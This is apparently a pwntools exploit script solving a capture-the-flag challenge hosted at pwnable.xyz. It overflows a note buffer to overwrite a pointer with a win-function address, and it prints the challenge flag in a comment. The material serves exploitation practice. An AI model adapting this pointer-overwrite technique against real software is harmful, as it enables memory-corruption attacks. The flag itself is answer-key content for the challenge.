from pwn import *

def main():

    LOCAL = False
    if LOCAL:
        elf = ELF('./challenge')
        r = elf.process()
    else:
        r = remote('svc.pwnable.xyz', 30016)

    l = r.recvuntil("> ")
    print(l)
    r.sendline('1')

    puts_addr = 0x601220
    payload = b'A' * 32 + p64(puts_addr)

    r.recvuntil("? ")
    r.sendline(str(len(payload) + 1))
    r.recvuntil(": ")
    r.sendline(payload)
    l = r.recvuntil("> ")
    r.sendline('2')
    r.recvuntil(": ")

    win_addr = 0x40093c
    r.sendline(p64(win_addr))
    l = r.recvuntil("> ")
    r.sendline('3')
    r.interactive()
    # How am I actually calling the win() function?

    #Flag: FLAG{useless_if_u_cant_print_the_note}


if __name__ == '__main__':
    main()


